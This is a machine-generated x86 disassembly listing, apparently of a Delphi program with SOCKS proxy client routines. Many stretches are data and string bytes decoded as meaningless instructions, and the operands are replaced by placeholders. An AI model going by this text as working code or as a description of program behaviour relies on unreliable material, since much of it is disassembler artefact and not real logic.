add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx + 0x3c0045 ] cs
add [ eax ] al
adc [ eax - 0x5d83ffbb ] cl
inc ecx
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x74d7ffc0 ] ah
inc ebp
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ edi + ebx * 4 + 0x41 ] bl
add [ eax ] ch
sahf
inc ecx
add [ edi + ebx * 4 + 0x41 ] ch
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx - 0x758bffbf ] bl
inc ebp
add [ ecx + ebp ] ch
inc eax
add [ ecx ] dl
push esp
dec ecx
inc ecx
outsb
je r-xdata
xor [ eax ] eax
inc esi
jb r-xdata
jne r-xdata
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
add eax [ eax ]
push ss
inc ecx
jo r-xdata
push [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jpe r-xdata
xor al 0x0
cli
dec [ ebx + 0x33f08bda ]
rcl [ ebp + 0x68 ] 0x3
mov eax [ ebp ]
dec ecx
insb
jb r-xdata
add bh bh
add [ eax ] eax
inc edx
popad
jae r-xdata
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
nop
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
push 0x64496e65
insb
mov [ rw-data ] esi
cmp [ rw-data ] 0x0
je r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_419b0c
test [ esi + 0x1c ] 0x10
mov ebx edx
mov esi eax
xor eax eax
add esp 0xfffffff0
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
mov eax eax
movsb [ edi ] [ esi ]
mov [ ebp ] eax
pop es
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
outsb
je r-xdata
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x31 ] 0x1
mov [ esi + 0x34 ] 0xfa
mov [ esi + 0x38 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458b0a
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
push ebp
push sub_458b03
je r-xdata
popad
je r-xdata
inc esi
jb r-xdata
je r-xdata
adc ah bh
push esi
inc esi
sbb al 0x10
cmp al 0x10
inc eax
add [ eax + eax ] dh
add bh bh
call sub_4033fc
dec eax
outsd
outsb
arpl [ ecx + 0x74 ] sp
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x50736148
inc edx
popad
jae r-xdata
popad
jae r-xdata
pop eax
mov [ ebp ] eax
mov al [ 0x6004588 ]
add [ eax ] dl
dec ecx
inc ecx
outsb
je r-xdata
add al 0x0
or ecx [ ecx + 0x64 ]
insb
push esp
imul ebp [ ebp + 0x65 ] 0x74754f
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e4f0c00
insb
jns r-xdata
inc [ ecx ]
inc esi
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xfa ] al
jpe r-xdata
add [ eax ] al
add [ eax ] al
inc edx
popad
jae r-xdata
add [ eax ] al
cmp dl 0x0
add [ eax ] al
add al 0x0
add [ eax ] dl
inc eax
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add [ gs : eax ] dl
inc eax
add [ ecx ] dh
add [ eax ] al
sub_458b28
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419b58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_458b54
push ebx
push esi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_458b98
test al al
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
sete al
or bl al
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_458b98
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
call sub_458618
test al al
jne r-xdata
test al al
je r-xdata
mov al 0x1
retn
mov eax [ rw-data ]
mov al [ eax + 0x30 ]
sub_458bc0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_458be5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458bec
retn
sub_458dd8
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_419b0c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_458e4a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
add esp 0xfffffff0
call sub_4033fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458e51
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ r-xdata ]
call sub_456a40
mov edx [ rw-data ]
mov [ edx ] eax
sub_458e70
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403464
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_419b58
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_458ed7
push [ fs : eax ]
mov [ fs : eax ] esp
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458ede
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ rw-data ]
call sub_40cb14
sub_458ef0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_458f9b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x32 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458fa2
lea eax [ ebp - 0x10 ]
call sub_403eac
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax [ ebp + 0x8 ]
inc eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp + 0x8 ]
call sub_408940
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
xor ecx ecx
call sub_408940
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
jmp r-xdata
sub_458fac
push ebx
push esi
xor ebx ebx
mov bl dl
lea ebx [ ebx + ebx * 2 ]
inc [ eax + ebx * 4 + 0x58 ]
cmp [ eax + ebx * 4 + 0x58 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ eax + ebx * 4 + 0x54 ] ecx
xor esi esi
mov [ eax + ebx * 4 + 0x50 ] esi
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_458fe4
push ebx
push esi
xor ebx ebx
mov bl dl
lea esi [ ebx + ebx * 2 ]
cmp [ eax + esi * 4 + 0x58 ] 0x0
jle r-xdata
pop esi
pop ebx
retn
add [ eax + esi * 4 + 0x50 ] ecx
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov ecx [ eax + esi * 4 + 0x50 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_459014
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
lea edi [ eax + eax * 2 ]
cmp [ esi + edi * 4 + 0x58 ] 0x1
jne r-xdata
dec [ esi + edi * 4 + 0x58 ]
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x4a ] 0x0
je r-xdata
mov ecx ebx
mov edx esi
mov eax [ esi + 0x4c ]
call [ esi + 0x48 ]
sub_459044
or [ eax ] eax
add [ eax ] al
cld
jae r-xdata
mov ebp esp
add al dh
ja r-xdata
xor eax eax
pop edx
mov eax rw-data
mov ecx 0x9
push ebp
push r-xdata
push [ fs : eax ]
add al bh
jae r-xdata
mov [ fs : eax ] esp
inc ebp
add [ edi + edi * 8 + 0x30 ] ah
add al dh
ja r-xdata
inc [ rw-data ]
jne r-xdata
xor [ ecx + ecx * 4 + 0x20 ] ah
add ah dh
jae r-xdata
add al dh
ja r-xdata
inc esi
add [ ebp + 0x15 ] dh
add al dh
jae r-xdata
add al dh
ja r-xdata
mov edx [ r-xdata ]
add [ ecx + 0x9 ] bh
add ah ch
jae r-xdata
add [ eax ] al
add [ eax + edi * 2 + 0x46 ] ah
add al ch
jae r-xdata
call sub_404928
add [ eax - 0x1bffb986 ] bh
jae r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4590d3
add [ esi + esi * 2 + 0x46 ] cl
add al ah
jae r-xdata
inc ebp
add bl al
jmp sub_40382c
add al dh
js r-xdata
pop ebx
cmpsd [ esi ] [ edi ]
cli
add ah bl
jae r-xdata
jmp r-xdata
add al ch
jbe r-xdata
retn
lea eax [ eax ]
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
add [ ebp - 0x75 ] dl
in al dx
retn
mov eax sub_459044
call sub_403bd4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4244e4
mov [ rw-data ] eax
sub_459100
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_459125
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45912c
retn
sub_459228
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_458e70
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_45925c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_459281
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459288
retn
sub_459548
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_458dd8
mov [ esi + 0x68 ] 0x0
mov [ esi + 0x7c ] 0x0
mov [ esi + 0x74 ] 0x438
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_45958c
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x114 ] ebx
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_459795
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x110 ] 0x4
mov [ ebp - 0x10f ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10e ] ax
cmp [ esi + 0x7c ] 0x2
jne r-xdata
lea ecx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_456a4c
mov edx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_457004
mov [ ebp - 0x10c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_457004
mov [ ebp - 0x10c ] eax
jmp r-xdata
add ebx 0x9
lea edx [ ebp - 0x110 ]
mov ecx ebx
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
lea edx [ ebp - 0x8 ]
mov ecx 0x8
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
mov al [ ebp - 0x7 ]
sub al 0x5a
je r-xdata
mov eax edi
call sub_40416c
push eax
mov eax edi
call sub_40436c
lea edx [ ebp + ebx - 0x106 ]
pop ecx
call sub_4028c8
mov eax edi
call sub_40416c
inc ebx
add eax ebx
mov ebx eax
mov [ ebp + ebx - 0x107 ] 0x0
lea eax [ ebp - 0x108 ]
mov edx [ esi + 0x78 ]
mov ecx 0xff
call sub_404148
xor ebx ebx
mov bl [ ebp - 0x108 ]
mov [ ebp + ebx - 0x107 ] 0x0
cmp [ esi + 0x7c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45979c
lea eax [ ebp - 0x124 ]
mov edx 0x5
call sub_403ed0
retn
dec al
je r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x11c ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x11c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x124 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x124 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
sub_4597b4
push ebp
mov ebp esp
push ecx
mov ecx 0x29
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_459d87
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov [ ebp - 0x10e ] 0x2
mov [ ebp - 0x10e ] 0x0
jmp r-xdata
mov al [ ebp - 0x10f ]
cmp al [ ebp - 0xd ]
jne r-xdata
mov al [ ebp - 0x10e ]
mov [ ebp - 0xd ] al
mov [ ebp - 0x110 ] 0x5
mov al 0x1
mov [ ebp - 0x10f ] al
and eax 0xff
add eax 0x2
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_4036a4#3
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
cmp al 0xff
jne r-xdata
mov [ ebp - 0x110 ] 0x5
mov [ ebp - 0x10f ] 0x1
mov [ ebp - 0x10e ] 0x0
mov [ ebp - 0x10d ] 0x3
mov eax [ ebp - 0x4 ]
call sub_40416c
mov [ ebp - 0x10c ] al
mov esi 0x5
mov eax [ ebp - 0x4 ]
call sub_40416c
test eax eax
jle r-xdata
mov [ ebp - 0x110 ] 0x1
mov eax [ ebx + 0x78 ]
call sub_40416c
mov [ ebp - 0x10f ] al
mov esi 0x2
mov eax [ ebx + 0x78 ]
call sub_40416c
test eax eax
jle r-xdata
cmp [ ebx + 0x68 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_40416c
add esi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10 ] ax
lea edx [ ebp + esi - 0x110 ]
lea eax [ ebp - 0x10 ]
mov ecx 0x2
call sub_4028c8
add esi 0x2
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor eax eax
push ebp
push sub_459ae7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x5
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40416c
push eax
mov eax [ ebp - 0x4 ]
call sub_40436c
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028c8
mov eax [ ebx + 0x78 ]
call sub_40416c
add esi eax
mov eax [ ebx + 0x70 ]
call sub_40416c
mov [ ebp + esi - 0x110 ] al
inc esi
mov eax [ ebx + 0x70 ]
call sub_40416c
test eax eax
jle r-xdata
mov eax [ ebx + 0x78 ]
call sub_40416c
push eax
mov eax [ ebx + 0x78 ]
call sub_40436c
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028c8
xor eax eax
mov al [ ebp - 0x10f ]
cmp eax 0x8
ja r-xdata
mov eax [ ebx + 0x70 ]
call sub_40416c
add esi eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_4036a4#5
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x70 ]
call sub_40416c
push eax
mov eax [ ebx + 0x70 ]
call sub_40436c
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028c8
lea edx [ ebp - 0x148 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x148 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp [ eax * 4 + sub_459b30 ]
cmp [ ebp - 0x10f ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
xor eax eax
push ebp
push sub_459d38
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459d8e
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_403ed0
retn
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_459b30
xlat
pushfd
inc ebp
add [ ecx - 0x65 ] bl
inc ebp
add [ ebp - 0x4effba65 ] al
fwait
inc ebp
add ch bl
fwait
inc ebp
add [ ecx ] cl
pushfd
inc ebp
add [ 0x5e00459c ] dh
pushfd
inc ebp
add [ edi - 0x16ffba64 ] al
jle r-xdata
add [ ebp - 0x1276b ] cl
jmp [ ecx + rw-data ]
add [ eax ] al
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
xor eax eax
push ebp
push sub_459d38
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459d8e
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_403ed0
retn
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_459d98
push ebx
mov bl [ eax + 0x7c ]
dec ebx
sub bl 0x2
jb r-xdata
call sub_45958c
pop ebx
retn
je r-xdata
call sub_4597b4
jmp r-xdata
pop ebx
retn
sub_459db4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_459dd9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459de0
retn
sub_459df0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sahf
inc ebp
add [ esi + ebx * 4 + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jle r-xdata
retn
inc ebp
add [ eax + eax ] ch
add [ eax ] al
cwde
push ss
inc ecx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x5e7bffc0 ] ah
inc ebp
add [ eax + 0x3f ] al
inc ecx
add [ eax + 0x3f ] cl
inc ecx
add [ ebp + 0x42580045 ] dh
inc ecx
add [ eax ] bh
inc ebx
inc ecx
add [ eax + 0x43 ] ch
inc ecx
add [ eax + 0x43 ] ah
inc ecx
add [ eax ] bl
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] bl
mov eax [ 0xffffffffa14c0045 ]
inc ebp
add [ edx ] bh
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
outsb
insb
mov eax eax
xchg esp eax
sahf
inc ebp
add [ edi ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
[ eax + eax ]
outsd
jb r-xdata
cmp al 0x10
inc eax
add [ eax ] ch
popad
outsb
insb
cmp [ gs : esi + 0x17240045 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
cwde
lahf
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00459f ] bl
add [ eax ] al
add al bl
inc edi
inc ebp
add [ eax ] al
[ eax ]
dec ebp
imul ebp [ esi + 0x3c ] 0x28004010
add [ 0x65696c43 ] cl
outsb
je r-xdata
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
popad
outsb
insb
add al 0x0
cmp al 0x10
inc eax
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
dec esi
outsd
je r-xdata
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ 0x43644945 ] dl
outsd
jne r-xdata
popad
outsb
insb
inc ebp
jb r-xdata
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
lahf
inc ebp
add [ eax + eax ] cl
add [ eax ] al
fadd [ edi + 0x45 ]
outsd
jb r-xdata
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
dec ebx
add eax 0xeca10000
jpe r-xdata
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
enter 0x45a0 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x45a0 0x0
or al 0x0
add [ eax ] al
dec esp
lahf
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
add [ ebx + esi ] dh
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax ] bl
inc ebp
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x60 ] ah
inc ebp
add [ eax + eax ] cl
add [ eax ] al
dec esp
lahf
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
outsd
jb r-xdata
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax * 2 + 0x6f536449 ] dl
dec ebp
popad
js r-xdata
push ecx
sbb [ esi + 0x5b ] bl
add [ ebx - 0x74307500 ] cl
salc
retn
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] dl
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ ebx + esi ] dh
imul ebp [ esi + 0x64 ] 0x74726f50
arpl [ ebx + 0x65 ] bp
je r-xdata
shl [ eax - 0x60 ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
